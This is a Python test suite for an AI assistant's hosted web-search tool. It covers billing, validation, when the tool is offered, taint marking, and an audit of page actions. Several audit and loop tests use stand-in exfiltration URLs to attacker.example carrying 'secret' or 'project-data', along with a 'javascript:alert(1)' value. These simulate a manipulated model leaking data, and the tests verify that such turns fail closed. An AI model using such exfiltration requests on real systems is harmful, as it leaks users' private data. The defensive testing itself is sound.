"""Hosted web search (docs/ASSISTANT_BROWSER_V2_PLAN.md 13.1, WI-16).

Pinned here:

  tool       validate_tools accepts one `web_search` entry with no options
             (the narrowest the API offers) and refuses anything else; the
             transport sends it only while ASSISTANT_HOSTED_SEARCH_ENABLED
             is on, asks for the action sources, replays web_search_call
             items, reports each call to the audit and bills each call;
  offer      the entry is sent only in an untainted normal conversation, not
             in Mailbox review, not on the browser follow-up turn, not for a
             person who turned web search off, and not once the turn itself
             is tainted; the gateway web tools are not offered while it is on;
  taint      a response with a web_search_call taints the message and the
             conversation, stores the citations as a tainted web_ result
             (browser URL provenance reads them as `search`) and keeps them
             out of cards;
  audit      a page action whose URL is not one of the call's own results
             fails the turn closed, as does an unknown action type or a
             search that was never offered; the log carries no query string;
  spend      the hold of a call that offers the tool adds tool-call fees,
             the call's cost is tokens plus USD 0.01 per call.
"""

from __future__ import annotations

import logging
from decimal import Decimal
from types import SimpleNamespace

import pytest

from app.assistant import llm_messages, loop, registry, repo
from app.assistant.tools import web as web_tools
from app.core.config import Settings, get_settings
from app.core.roles import Role
from app.services import assistant_web, llm, llm_gate, llm_pricing, llm_queue

from tests.assistant_fakes import CONV, MSG_ASSISTANT, USER
from tests import test_assistant_loop as base_loop
from tests.test_assistant_loop import _answer, _call, _items, _result

world = base_loop.world   # the loop suite's fixture: fake DB, shim and model script

HOSTED = {"type": "web_search", "search_context_size": "low"}
FUNCTION_TOOL = {"type": "function", "name": "whats_due", "description": "d",
                 "parameters": {"type": "object", "properties": {}, "additionalProperties": False}, "strict": True}
SEARCH_URL = "https://example.com/spec-sheet"
OTHER_URL = "https://vendor.example.org/catalog?page=2"


def _settings(**over) -> Settings:
    base = dict(_env_file=None, openai_api_key="o-key", anthropic_api_key="a-key",
                assistant_enabled=True, assistant_token_secret="s" * 48, assistant_hosted_search_enabled=True)
    base.update(over)
    return Settings(**base)


# ── pricing ──────────────────────────────────────────────────────────────────


def test_a_search_call_costs_one_cent_on_top_of_the_tokens():
    assert llm_pricing.WEB_SEARCH_CALL_PRICE == Decimal("0.01")
    assert llm_pricing.web_search_cost(0) == Decimal("0.000000")
    assert llm_pricing.web_search_cost(3) == Decimal("0.030000")
    base = llm.LlmUsage(input_tokens=1_000_000, output_tokens=0)
    plain = llm_pricing.cost_for("gpt-5.4", base)
    with_search = llm_pricing.cost_for("gpt-5.4", llm_messages.WebSearchUsage(
        input_tokens=1_000_000, output_tokens=0, web_search_calls=4))
    assert with_search - plain == Decimal("0.04")


def test_the_fee_needs_a_priced_model_and_plain_usage_is_unchanged():
    usage = llm_messages.WebSearchUsage(input_tokens=10, web_search_calls=2)
    assert llm_pricing.cost_for("not-a-priced-model", usage) is None
    assert llm_pricing.cost_for("gpt-5.4", llm.LlmUsage(input_tokens=10)) == \
        llm_pricing.cost_for("gpt-5.4", llm_messages.WebSearchUsage(input_tokens=10))


# ── the tool entry ───────────────────────────────────────────────────────────


def test_validate_tools_accepts_one_hosted_entry_with_no_options():
    assert llm_messages.validate_tools([FUNCTION_TOOL, {"type": "web_search"}]) == [FUNCTION_TOOL, HOSTED]
    assert llm_messages.validate_tools([dict(HOSTED)]) == [HOSTED]
    out = llm_messages.validate_tools([{"type": "web_search"}])
    out[0]["search_context_size"] = "high"
    assert llm_messages.HOSTED_WEB_SEARCH["search_context_size"] == "low"


@pytest.mark.parametrize("entry", [
    {"type": "web_search", "user_location": {"type": "approximate", "city": "Las Vegas"}},
    {"type": "web_search", "search_context_size": "high"},
    {"type": "web_search", "filters": {"allowed_domains": ["example.com"]}},
])
def test_validate_tools_refuses_any_hosted_option(entry):
    with pytest.raises(ValueError, match="no options"):
        llm_messages.validate_tools([entry])


def test_validate_tools_refuses_two_hosted_entries_and_other_tool_types():
    with pytest.raises(ValueError, match="only one"):
        llm_messages.validate_tools([{"type": "web_search"}, {"type": "web_search"}])
    for other in ({"type": "web_search_preview"}, {"type": "code_interpreter"}, {"type": "file_search"}):
        with pytest.raises(ValueError, match="function tools"):
            llm_messages.validate_tools([other])


# ── the transport ────────────────────────────────────────────────────────────


class _FakeOpenAI:
    def __init__(self, *responses):
        self.queue = list(responses)
        self.calls: list[dict] = []
        self.responses = SimpleNamespace(create=self._create)

    def _create(self, **kwargs):
        self.calls.append(kwargs)
        return self.queue.pop(0)

    def with_options(self, **kw):
        return self


def _usage():
    return SimpleNamespace(
        input_tokens=1_000_000, input_tokens_details=SimpleNamespace(cached_tokens=0),
        output_tokens=0, output_tokens_details=SimpleNamespace(reasoning_tokens=0),
    )


def _response(output, text="Answer."):
    return SimpleNamespace(id="resp_1", status="completed", incomplete_details=None, output_text=text,
                           output=list(output), usage=_usage())


def _search_item(n, url_sources=(SEARCH_URL,), query="spec sheet"):
    return {"type": "web_search_call", "id": f"ws_{n}", "status": "completed",
            "action": {"type": "search", "query": query, "queries": [query],
                       "sources": [{"type": "url", "url": u} for u in url_sources]}}


def _open_item(n, url):
    return {"type": "web_search_call", "id": f"ws_{n}", "status": "completed",
            "action": {"type": "open_page", "url": url}}


def _message_item(text="Found it.", url=SEARCH_URL):
    return {"type": "message", "id": "msg_1", "role": "assistant",
            "content": [{"type": "output_text", "text": text,
                         "annotations": [{"type": "url_citation", "url": url, "title": "t",
                                          "start_index": 0, "end_index": 3}]}]}


@pytest.fixture
def quiet(monkeypatch):
    llm_gate.reset_gates()
    logged: list[dict] = []
    monkeypatch.setattr(llm_gate, "log_call", lambda **kw: logged.append(kw))
    monkeypatch.setattr(llm_queue, "renew_lease", lambda job=None: True)
    yield logged
    llm_gate.reset_gates()


def test_the_transport_sends_the_entry_asks_for_sources_and_bills_each_call(quiet, monkeypatch):
    client = _FakeOpenAI(_response([
        {"type": "reasoning", "id": "rs_1", "summary": [], "encrypted_content": "enc"},
        _search_item(1), _open_item(2, SEARCH_URL), _message_item(),
    ]))
    monkeypatch.setattr(llm, "_client_for", lambda route, settings: client)
    result = llm_messages.complete_messages(
        system="sys", messages=[llm_messages.user_message("find the spec sheet")],
        tools=[FUNCTION_TOOL, {"type": "web_search"}], settings=_settings())
    sent = client.calls[0]
    assert sent["tools"] == [FUNCTION_TOOL, HOSTED]
    assert sent["include"] == ["reasoning.encrypted_content", "web_search_call.action.sources"]
    assert sent["store"] is False and "previous_response_id" not in sent
    # One response runs at most the calls the spend hold reserved.
    assert sent["max_tool_calls"] == llm_messages.HOSTED_SEARCH_MAX_CALLS == loop.HOSTED_SEARCH_RESERVE_CALLS
    assert [c["action_type"] for c in result.extra["web_search"]] == ["search", "open_page"]
    assert result.extra["web_search"][0]["sources"] == [SEARCH_URL]
    assert result.extra["citations"] == [SEARCH_URL]
    # Two calls: the fee is in the result and in the llm_call_log row.
    token_cost = llm_pricing.cost_for("gpt-5.4", llm.LlmUsage(input_tokens=1_000_000))
    assert result.cost_usd == token_cost + Decimal("0.02")
    assert Decimal(str(quiet[0]["cost_usd"])) == result.cost_usd
    # The items replay in order: reasoning, both search calls, the message.
    assert [i["type"] for i in result.output_items] == ["reasoning", "web_search_call", "web_search_call", "message"]
    assert result.output_items[1]["action"]["sources"] == [{"type": "url", "url": SEARCH_URL}]
    assert result.output_items[2] == {"type": "web_search_call", "id": "ws_2", "status": "completed",
                                      "action": {"type": "open_page", "url": SEARCH_URL}}
    llm_messages.validate_messages([llm_messages.user_message("x"), *result.output_items])


def test_a_call_without_the_hosted_tool_is_unchanged(quiet, monkeypatch):
    client = _FakeOpenAI(_response([_message_item()]))
    monkeypatch.setattr(llm, "_client_for", lambda route, settings: client)
    result = llm_messages.complete_messages(
        system="s", messages=[llm_messages.user_message("x")], tools=[FUNCTION_TOOL], settings=_settings())
    assert client.calls[0]["include"] == ["reasoning.encrypted_content"]
    assert "max_tool_calls" not in client.calls[0]
    assert client.calls[0]["tools"] == [FUNCTION_TOOL]
    assert result.extra == {}
    assert result.cost_usd == llm_pricing.cost_for("gpt-5.4", llm.LlmUsage(input_tokens=1_000_000))


def test_the_transport_refuses_the_entry_while_the_flag_is_off(quiet, monkeypatch):
    client = _FakeOpenAI(_response([_message_item()]))
    monkeypatch.setattr(llm, "_client_for", lambda route, settings: client)
    with pytest.raises(ValueError, match="not enabled"):
        llm_messages.complete_messages(
            system="s", messages=[llm_messages.user_message("x")], tools=[{"type": "web_search"}],
            settings=_settings(assistant_hosted_search_enabled=False))
    assert client.calls == []


def test_a_web_search_item_without_an_id_or_action_is_not_replayed():
    out = llm_messages.replayable_items([{"type": "web_search_call", "status": "completed",
                                          "action": {"type": "search", "query": "q"}},
                                         {"type": "web_search_call", "id": "ws_9"}])
    assert out == []


# ── the offer rule ───────────────────────────────────────────────────────────


def _offered(**over):
    args = dict(role=Role.EXECUTIVE, mode=registry.MODE_NORMAL, follow_up=False, conversation_tainted=False,
                mailbox_tainted=False, settings=_settings(), disabled=())
    args.update(over)
    return web_tools.hosted_search_offered(**args)


def test_hosted_search_is_offered_in_a_clean_normal_conversation():
    assert _offered() is True


@pytest.mark.parametrize("over", [
    {"settings": _settings(assistant_hosted_search_enabled=False)},
    {"settings": SimpleNamespace(assistant_enabled=False, assistant_hosted_search_enabled=True)},
    {"conversation_tainted": True},
    {"mailbox_tainted": True},
    {"follow_up": True},
    {"mode": registry.MODE_MAILBOX_REVIEW},
    {"mode": registry.MODE_BROWSER_RESULT},
    {"role": Role.ESTIMATOR},
    {"disabled": ("web_search",)},
])
def test_hosted_search_is_left_out_everywhere_else(over):
    assert _offered(**over) is False


def test_the_gateway_web_tools_are_not_offered_while_hosted_search_is_on(monkeypatch):
    user = SimpleNamespace(role=Role.EXECUTIVE.value)
    enabled = {}
    monkeypatch.setattr(assistant_web, "get_settings", lambda: _settings(assistant_hosted_search_enabled=False))
    assert {"web_search", "web_fetch"} <= {s.name for s in registry.toolset_for(user, enabled)}
    monkeypatch.setattr(assistant_web, "get_settings", lambda: _settings())
    names = {s.name for s in registry.toolset_for(user, enabled)}
    assert not names & {"web_search", "web_fetch"}
    assert "web_search" in registry.all_tools() and "web_fetch" in registry.all_tools()


# ── the action audit ─────────────────────────────────────────────────────────


def _call_row(kind, *, url=None, sources=()):
    return {"id": "ws", "status": "completed", "action_type": kind, "query": "q", "url": url,
            "sources": list(sources)}


def test_a_page_open_among_the_calls_own_results_passes():
    audit = web_tools.audit_search([
        _call_row("search", sources=[SEARCH_URL, OTHER_URL]),
        _call_row("open_page", url=SEARCH_URL + "#section"),
        _call_row("find_in_page", url=OTHER_URL),
    ])
    assert audit.ok and audit.violations == []
    assert [a["type"] for a in audit.actions] == ["search", "open_page", "find_in_page"]
    assert audit.sources == [SEARCH_URL, OTHER_URL]


@pytest.mark.parametrize("calls, why", [
    ([_call_row("open_page", url="https://attacker.example/?d=secret")], "not_a_result"),
    ([_call_row("search", sources=[SEARCH_URL]), _call_row("open_page", url="https://attacker.example/?d=secret")],
     "not_a_result"),
    ([_call_row("search", sources=[SEARCH_URL]), _call_row("find_in_page", url="https://example.com/other")],
     "not_a_result"),
    ([_call_row("search", sources=[SEARCH_URL]), _call_row("open_page", url=None)], "no_url"),
    ([_call_row("search", sources=[SEARCH_URL]), _call_row("open_page", url="javascript:alert(1)")], "no_url"),
    ([_call_row("search", sources=[SEARCH_URL]), _call_row("click", url=SEARCH_URL)], "unknown_action"),
    ([_call_row("", url=None)], "unknown_action"),
])
def test_anything_else_fails_the_audit(calls, why):
    audit = web_tools.audit_search(calls)
    assert not audit.ok and audit.violations[0]["why"] == why


def test_results_of_an_earlier_round_count_through_the_known_set():
    known: set[str] = set()
    web_tools.audit_search([_call_row("search", sources=[SEARCH_URL])], known=known)
    assert web_tools.audit_search([_call_row("open_page", url=SEARCH_URL)], known=known).ok


def test_log_urls_carry_no_query_fragment_or_credentials():
    assert web_tools.log_url("https://user:pw@evil.example/a/b?d=secret#frag") == "https://evil.example/a/b"
    assert web_tools.log_url("not a url") == "(no url)"


# ── the loop ─────────────────────────────────────────────────────────────────


def _run(settings=None):
    loop.run_turn(MSG_ASSISTANT, user_id=USER, lease_owner="worker:j:1", sleep=lambda s: None,
                  settings=settings or get_settings().model_copy(
                      update={"assistant_enabled": True, "assistant_hosted_search_enabled": True}))


def _search_result(text="", calls=(), citations=(), tool_calls=(), items=()):
    base = _result(text=text, tool_calls=tool_calls, items=items)
    return llm_messages.MessagesResult(
        text=base.text, tool_calls=base.tool_calls, output_items=base.output_items, usage=base.usage,
        response_id=base.response_id, model=base.model, cost_usd=base.cost_usd,
        extra={"web_search": list(calls), "citations": list(citations)})


def _hosted_in(call) -> bool:
    return any(isinstance(t, dict) and t.get("type") == "web_search" for t in (call.get("tools") or []))


def test_a_clean_conversation_is_offered_the_tool_and_a_flag_off_one_is_not(world):
    world.script[:] = [_result(text="Hello.")]
    _run()
    assert _hosted_in(world.calls[0])
    assert world.calls[0]["tools"][-1] == HOSTED
    assert not {"web_search", "web_fetch"} & {t.get("name") for t in world.calls[0]["tools"]}


def test_the_tool_is_not_offered_while_the_flag_is_off(world):
    world.script[:] = [_result(text="Hello.")]
    _run(get_settings().model_copy(update={"assistant_enabled": True, "assistant_hosted_search_enabled": False}))
    assert not _hosted_in(world.calls[0])


@pytest.mark.parametrize("conv", [{"tainted_at": "2026-10-22T07:00:00+00:00"}, {"mode": "mailbox_review"},
                                  {"mailbox_tainted_at": "2026-10-22T07:00:00+00:00"}])
def test_the_tool_is_not_offered_in_a_tainted_or_review_conversation(world, conv):
    world.db.tables["profiles"][0]["role"] = "executive"
    world.db.tables["assistant_conversations"][0].update(conv)
    world.script[:] = [_result(text="Hello.")]
    _run()
    assert not _hosted_in(world.calls[0])


def test_the_tool_is_not_offered_when_the_person_turned_web_search_off(world):
    world.db.tables["assistant_settings"][0]["disabled_tools"] = ["web_search"]
    world.script[:] = [_result(text="Hello.")]
    _run()
    assert not _hosted_in(world.calls[0])


def test_a_search_turn_taints_the_message_and_conversation_and_records_the_citations(world):
    world.script[:] = [_search_result(
        text="The spec sheet says 200 A.",
        calls=[_call_row("search", sources=[SEARCH_URL, OTHER_URL]), _call_row("open_page", url=SEARCH_URL)],
        citations=[SEARCH_URL])]
    _run()
    row = _answer(world.db)
    assert row["status"] == "done" and "200 A" in row["content"]
    assert row["tainted"] is True
    assert world.db.tables["assistant_conversations"][0]["tainted_at"] is not None
    assert [(p["tool_name"], p["progress_label"], p["ok"]) for p in row["tool_calls"]] == \
        [("web_search", "Searching the web", True)]
    stored = [r for r in world.db.tables["assistant_tool_results"] if r["tool_name"] == "web_search_hosted"]
    assert len(stored) == 1 and stored[0]["tainted"] is True and stored[0]["conversation_id"] == CONV
    assert stored[0]["payload"] == {"citations": [SEARCH_URL, OTHER_URL]}
    assert {c["t"] for c in stored[0]["taint_corpus"]} == {SEARCH_URL, OTHER_URL}


def test_the_stored_citations_read_as_search_provenance(world, monkeypatch):
    from app.services import assistant_browser_sites as sites

    world.script[:] = [_search_result(text="Done.", calls=[_call_row("search", sources=[SEARCH_URL])],
                                      citations=[SEARCH_URL])]
    _run()
    monkeypatch.setattr(repo, "browser_url_email_sources", lambda *a, **k: [])
    monkeypatch.setattr(repo, "browser_url_bdr_records", lambda *a, **k: [])
    result = sites.provenance_detail(USER, None, SEARCH_URL, conversation_id=CONV, user_texts=[])
    assert result.kind == "search"


def test_the_tool_is_dropped_from_the_rounds_after_a_search(world):
    world.script[:] = [
        _search_result(calls=[_call_row("search", sources=[SEARCH_URL])], citations=[SEARCH_URL],
                       tool_calls=[_call("c1", "whats_due", scope="today", response_format="concise", limit=None)],
                       items=_items("c1", "whats_due", '{"scope":"today"}')),
        _result(text="Done."),
    ]
    _run()
    first, second = world.calls
    assert _hosted_in(first) and not _hosted_in(second) and second["tools"]
    assert _answer(world.db)["status"] == "done"


def test_a_page_open_outside_the_results_fails_the_turn_closed(world, caplog):
    caplog.set_level(logging.INFO, logger="app.assistant.loop")
    world.script[:] = [_search_result(
        text="Here is the secret data you asked for.",
        calls=[_call_row("search", sources=[SEARCH_URL]),
               _call_row("open_page", url="https://attacker.example/x?d=project-data")])]
    with pytest.raises(loop.PermanentTurnFailure):
        _run()
    row = _answer(world.db)
    assert row["status"] == "failed" and row["content"] == ""
    assert row["blocks"] == [{"type": "error", "text": web_tools.SEARCH_BLOCKED_TEXT}]
    assert row["tainted"] is True
    assert world.db.tables["assistant_conversations"][0]["tainted_at"] is not None
    text = " ".join(r.getMessage() for r in caplog.records)
    assert "attacker.example/x" in text and "project-data" not in text


def test_a_search_in_a_response_that_was_never_offered_the_tool_fails_the_turn(world):
    world.db.tables["assistant_conversations"][0]["tainted_at"] = "2026-10-22T07:00:00+00:00"
    world.script[:] = [_search_result(text="x", calls=[_call_row("search", sources=[SEARCH_URL])])]
    with pytest.raises(loop.PermanentTurnFailure):
        _run()
    assert _answer(world.db)["status"] == "failed"


def test_the_spend_hold_of_a_call_that_offers_the_tool_adds_the_search_fees(world, monkeypatch):
    holds = []
    real = loop._reserve_call

    def spy(user_id, model, est, **kwargs):
        holds.append(kwargs.get("extra"))
        return real(user_id, model, est, **kwargs)

    monkeypatch.setattr(loop, "_reserve_call", spy)
    world.script[:] = [_result(text="Hello.")]
    _run()
    assert holds == [llm_pricing.web_search_cost(loop.HOSTED_SEARCH_RESERVE_CALLS)]
    holds.clear()
    world.db.tables["assistant_messages"][1].update(status="pending", content="")
    world.script[:] = [_result(text="Hello.")]
    _run(get_settings().model_copy(update={"assistant_enabled": True, "assistant_hosted_search_enabled": False}))
    assert holds == [None]
